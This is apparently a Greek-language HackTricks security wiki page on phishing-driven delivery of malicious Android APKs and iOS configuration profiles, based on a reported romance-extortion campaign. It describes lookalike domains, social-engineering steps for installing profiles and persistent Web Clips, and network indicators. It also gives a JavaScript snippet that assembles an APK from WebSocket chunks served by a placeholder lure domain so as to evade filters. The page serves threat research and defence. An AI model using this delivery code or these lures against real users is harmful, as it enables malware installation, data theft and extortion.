# Mobile Phishing & Διανομή Κακόβουλων Εφαρμογών (Android & iOS)

{{#include ../../banners/hacktricks-training.md}}

> [!INFO]
> Αυτή η σελίδα καλύπτει τεχνικές που χρησιμοποιούν απειλητικοί παράγοντες για τη διανομή **κακόβουλων Android APK** και **προφίλ διαμόρφωσης για κινητές συσκευές iOS** μέσω phishing (SEO, social engineering, πλαστά καταστήματα, εφαρμογές γνωριμιών κ.λπ.).
> Το υλικό βασίζεται στην καμπάνια SarangTrap, την οποία αποκάλυψε η Zimperium zLabs (2025), καθώς και σε άλλες δημόσιες έρευνες.<sup>[[1]](#references)</sup>

## Ροή Επίθεσης

1. **Υποδομή SEO/Phishing**
   * Κατοχύρωση δεκάδων παρόμοιων domains (γνωριμίες, κοινή χρήση στο cloud, υπηρεσίες αυτοκινήτων…).
     – Χρήση λέξεων-κλειδιών στην τοπική γλώσσα και emoji στο στοιχείο `<title>` για καλύτερη κατάταξη στο Google.
     – Φιλοξενία οδηγιών εγκατάστασης τόσο για Android (`.apk`) όσο και για iOS στην ίδια landing page.
2. **Λήψη Πρώτου Σταδίου**
   * Android: απευθείας σύνδεσμος προς APK χωρίς υπογραφή ή από «κατάστημα τρίτου μέρους».
   * iOS: σύνδεσμος `itms-services://` ή απλός σύνδεσμος HTTPS προς κακόβουλο προφίλ **mobileconfig** (βλ. παρακάτω).
3. **Συμπεριφορά Android Μετά την Εγκατάσταση**
   * Η εκτέλεση υπό τον έλεγχο C2, η κατάχρηση δικαιωμάτων, οι παρακάμψεις dropper, η συλλογή δεδομένων στο παρασκήνιο και άλλες συμπεριφορές malware μετά την εγκατάσταση καλύπτονται στην παρακάτω ειδική σελίδα Android Malware Post-Exploitation.
4. **Τεχνική Παράδοσης iOS**
   * Ένα μόνο **προφίλ διαμόρφωσης για κινητές συσκευές** μπορεί να ζητήσει `PayloadType=com.apple.sharedlicenses`, `com.apple.managedConfiguration` κ.λπ., ώστε να εγγράψει τη συσκευή σε εποπτεία τύπου «MDM».
   * Οδηγίες social engineering:
     1. Άνοιγμα των Ρυθμίσεων ➜ *Λήφθηκε προφίλ*.
     2. Πάτημα στο *Εγκατάσταση* τρεις φορές (με στιγμιότυπα οθόνης στη σελίδα phishing).
     3. Αποδοχή του προφίλ χωρίς υπογραφή ➜ ο επιτιθέμενος αποκτά δικαίωμα πρόσβασης στις *Επαφές* και τις *Φωτογραφίες*, χωρίς έλεγχο από το App Store.
5. **Payload Web Clip iOS (εικονίδιο εφαρμογής phishing)**
   * Τα payload `com.apple.webClip.managed` μπορούν να **καρφιτσώσουν μια διεύθυνση URL phishing στην Αρχική οθόνη** με εικονίδιο/ετικέτα επωνυμίας.
   * Τα Web Clip μπορούν να εκτελούνται **σε πλήρη οθόνη** (κρύβοντας το περιβάλλον εργασίας του browser) και να ορίζονται ως **μη αφαιρέσιμα**, αναγκάζοντας το θύμα να διαγράψει το προφίλ για να αφαιρέσει το εικονίδιο.<sup>[[3]](#references)</sup>
6. **Επίπεδο Δικτύου**
   * Απλό HTTP, συχνά στη θύρα 80, με HOST header όπως `api.<phishingdomain>.com`.
   * `User-Agent: Dalvik/2.1.0 (Linux; U; Android 13; Pixel 6 Build/TQ3A.230805.001)` (χωρίς TLS → εύκολος εντοπισμός).

## Android Malware Post-Exploitation

Για τεχνικές Android malware μετά την εγκατάσταση, όπως C2, κατάχρηση Accessibility, overlays, αυτοματοποίηση ATS, σταδιακή φόρτωση DEX, premium SMS και persistence, ανατρέξτε στη σελίδα:

{{#ref}}
../basic-forensic-methodology/android-malware-post-exploitation.md
{{#endref}}

## Λαθραία Διανομή APK μέσω Socket.IO/WebSocket + Πλαστές Σελίδες Google Play

Οι επιτιθέμενοι αντικαθιστούν όλο και συχνότερα τους στατικούς συνδέσμους APK με κανάλι Socket.IO/WebSocket ενσωματωμένο σε δελεαστικές σελίδες που μοιάζουν με το Google Play. Έτσι αποκρύπτεται το URL του payload, παρακάμπτονται τα φίλτρα URL/επέκτασης και διατηρείται μια ρεαλιστική εμπειρία εγκατάστασης.<sup>[[2]](#references)[[4]](#references)</sup>

Τυπική ροή client που παρατηρήθηκε στην πράξη:

<details>
<summary>Πλαστό πρόγραμμα λήψης Play μέσω Socket.IO (JavaScript)</summary>

```javascript
// Open Socket.IO channel and request payload
const socket = io("wss://<lure-domain>/ws", { transports: ["websocket"] });
socket.emit("startDownload", { app: "com.example.app" });

// Accumulate binary chunks and drive fake Play progress UI
const chunks = [];
socket.on("chunk", (chunk) => chunks.push(chunk));
socket.on("downloadProgress", (p) => updateProgressBar(p));

// Assemble APK client‑side and trigger browser save dialog
socket.on("downloadComplete", () => {
  const blob = new Blob(chunks, { type: "application/vnd.android.package-archive" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url; a.download = "app.apk"; a.style.display = "none";
  document.body.appendChild(a); a.click();
});
```

</details>

Γιατί παρακάμπτει απλούς ελέγχους:
- Δεν εκτίθεται στατικό URL APK· το payload ανασυντίθεται στη μνήμη από frames WebSocket.
- Τα φίλτρα URL/MIME/επέκτασης που αποκλείουν άμεσες απαντήσεις .apk ενδέχεται να μην εντοπίσουν δυαδικά δεδομένα που διοχετεύονται μέσω WebSockets/Socket.IO.
- Τα crawlers και τα URL sandboxes που δεν εκτελούν WebSockets δεν θα ανακτήσουν το payload.

Δείτε επίσης το WebSocket tradecraft και τα εργαλεία:

{{#ref}}
../../pentesting-web/websocket-attacks.md
{{#endref}}


## References

- [1] [Η σκοτεινή πλευρά του ρομαντισμού: Εκστρατεία εκβιασμού SarangTrap](https://zimperium.com/blog/the-dark-side-of-romance-sarangtrap-extortion-campaign)
- [2] [Socket.IO](https://socket.io)
- [3] [Ρυθμίσεις payload Web Clips για συσκευές Apple](https://support.apple.com/guide/deployment/web-clips-payload-settings-depbc7c7808/web)
- [4] [Banker Trojan που στοχεύει χρήστες Android στην Ινδονησία και το Βιετνάμ](https://dti.domaintools.com/banker-trojan-targeting-indonesian-and-vietnamese-android-users/)
{{#include ../../banners/hacktricks-training.md}}
